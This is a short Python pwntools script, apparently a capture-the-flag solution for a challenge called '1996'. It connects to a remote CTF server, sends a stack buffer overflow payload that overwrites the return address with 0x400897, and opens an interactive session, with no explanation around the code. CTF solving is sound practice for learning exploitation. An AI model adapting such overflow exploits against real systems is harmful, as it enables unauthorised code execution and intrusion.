from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3013)
#p = process('./1996')

print p.recvuntil('read? ')

payload = 'a'*0x410 + 'b'*8
payload += p64(0x400897)

p.sendline(payload)

sleep(0.5)

p.interactive()
